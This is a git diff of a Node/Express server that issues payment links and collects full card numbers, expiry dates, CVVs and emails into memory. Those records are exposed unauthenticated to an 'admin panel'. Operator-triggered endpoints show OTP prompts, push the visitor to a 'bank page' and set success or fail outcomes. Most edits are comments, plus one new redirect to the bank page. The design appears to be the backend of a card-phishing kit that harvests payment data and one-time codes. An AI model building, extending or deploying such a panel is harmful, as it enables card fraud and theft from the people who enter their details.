@@ -6,15 +6,15 @@ import crypto from 'crypto';
 const app = express();
 app.use(bodyParser.json());
 app.use(cors());
-app.use(express.static(".")); // Serves static files from current directory
+app.use(express.static(".")); // Serves static files from the current directory
 
-// In-memory data stores
+// In-memory maps for storing payment links and transactions
 const transactions = new Map();
 const paymentLinks = new Map();
 
-// -----------------------
+// ------------------------------
 // Generate Payment Link Endpoint
-// -----------------------
+// ------------------------------
 app.post('/api/generatePaymentLink', (req, res) => {
   try {
     const { amount, description } = req.body;
@@ -26,7 +26,6 @@ app.post('/api/generatePaymentLink', (req, res) => {
         message: "Invalid amount. Must be a positive number" 
       });
     }
-    
     if (!description || !description.trim()) {
       return res.status(400).json({ 
         status: "error", 
@@ -34,14 +33,14 @@ app.post('/api/generatePaymentLink', (req, res) => {
       });
     }
     
-    // Generate secure invoice ID
+    // Generate secure invoice ID (a random hexadecimal string)
     const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
     
-    // Determine protocol (if behind a proxy, use x-forwarded-proto)
+    // Determine the protocol (if behind a proxy, use the X-Forwarded-Proto header)
     const protocol = req.headers['x-forwarded-proto'] || req.protocol;
     const paymentLink = `${protocol}://${req.get('host')}/landing.html?pid=${invoiceId}`;
     
-    // Store payment details in memory
+    // Save payment details in the paymentLinks map
     paymentLinks.set(invoiceId, {
       amount: parseFloat(amount),
       description: description.trim(),
@@ -49,7 +48,7 @@ app.post('/api/generatePaymentLink', (req, res) => {
       createdAt: new Date().toISOString()
     });
     
-    // Return a single JSON response
+    // Return JSON response with the payment link
     res.json({ status: "success", paymentLink });
     
   } catch (error) {
@@ -61,9 +60,9 @@ app.post('/api/generatePaymentLink', (req, res) => {
   }
 });
 
-// -----------------------
-// Other Endpoints
-// -----------------------
+// ------------------------------
+// Get Payment Details (for landing and payment pages)
+// ------------------------------
 app.get('/api/getPaymentDetails', (req, res) => {
   const { pid } = req.query;
   if (!pid || !paymentLinks.has(pid)) {
@@ -73,6 +72,9 @@ app.get('/api/getPaymentDetails', (req, res) => {
   res.json({ status: "success", payment });
 });
 
+// ------------------------------
+// Get Transaction Details (for success/fail pages)
+// ------------------------------
 app.get('/api/getTransactionDetails', (req, res) => {
   const { invoiceId } = req.query;
   const txn = transactions.get(invoiceId);
@@ -82,11 +84,17 @@ app.get('/api/getTransactionDetails', (req, res) => {
   res.json(txn);
 });
 
+// ------------------------------
+// Get All Transactions (for admin panel)
+// ------------------------------
 app.get('/api/transactions', (req, res) => {
   const txList = Array.from(transactions.values());
   res.json(txList);
 });
 
+// ------------------------------
+// Process Payment Details Endpoint
+// ------------------------------
 app.post('/api/sendPaymentDetails', (req, res) => {
   const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
   const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
@@ -115,6 +123,9 @@ app.post('/api/sendPaymentDetails', (req, res) => {
   res.json({ status: "success", invoiceId });
 });
 
+// ------------------------------
+// OTP and Redirect Endpoints
+// ------------------------------
 app.post('/api/showOTP', (req, res) => {
   const { invoiceId } = req.body;
   const txn = transactions.get(invoiceId);
@@ -188,10 +199,15 @@ app.post('/api/updateRedirectStatus', (req, res) => {
     redirectStatus,
     redirectUrl: redirectStatus === 'success'
       ? `/success.html?invoiceId=${invoiceId}`
-      : `/fail.html?invoiceId=${invoiceId}`
+      : redirectStatus === 'fail'
+      ? `/fail.html?invoiceId=${invoiceId}`
+      : `/bankpage.html?invoiceId=${invoiceId}`
   });
 });
 
+// ------------------------------
+// Bank Page Endpoints
+// ------------------------------
 app.post('/api/redirectToBankPage', (req, res) => {
   const { invoiceId } = req.body;
   const txn = transactions.get(invoiceId);
@@ -224,6 +240,9 @@ app.post('/api/hideBankpage', (req, res) => {
   res.json({ status: 'success' });
 });
 
+// ------------------------------
+// Start the Server
+// ------------------------------
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
